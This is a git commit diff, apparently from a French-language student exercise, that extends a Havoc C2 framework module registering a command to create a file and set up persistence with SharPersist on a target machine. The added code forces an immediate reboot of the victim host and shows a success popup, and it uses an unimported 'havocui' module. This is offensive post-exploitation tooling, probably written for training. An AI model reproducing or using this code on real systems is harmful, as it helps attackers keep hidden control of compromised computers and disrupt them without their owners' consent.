b684ffb4c49ebf86563fa8d920292f940b21565c
Clément Vandewalle <tbhone@MacBook-Pro-de-Clement.local>
2024-12-05 17:13:58 +0100

    final commit

--- EX2/ex2.py
+++ EX2/ex2.py
@@ -1,3 +1,4 @@
+import subprocess
 from crontab import SHELL
 from havoc import Demon, RegisterCommand
 import os
@@ -20,7 +21,29 @@ def create_file_and_persist(demonID, *params):
     except Exception as e:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de l'exécution de la commande de persistance : {str(e)}")
         return False
+    
+    #ICI JE FAIS LE REBOOT
 
+    try:
+        subprocess.run(["shutdown", "/r", "/t", "0"], check=True)
+        demon.ConsoleWrite(demon.CONSOLE_INFO, "Reboot de l'ordi")
+        
+    except Exception as e:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"échec du Reboot : {str(e)}")
+        return False
+    
+    #Ici j'affiche une popup permettant de confirmer la réussite ou non des opérations
+
+    try:
+        havocui.messagebox("Succès", "Réussite des opérations.")
+
+    except Exception as e:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Échec de l'affichage de la Pop-Up : {str(e)}")
+        return False
+    
     return TaskID
 
 RegisterCommand(create_file_and_persist, "", "create_file_and_persist", "Crée un fichier et configure la persistance avec SharPersist.", 1, "Aucun argument supplémentaire nécessaire", "")
+
+
+
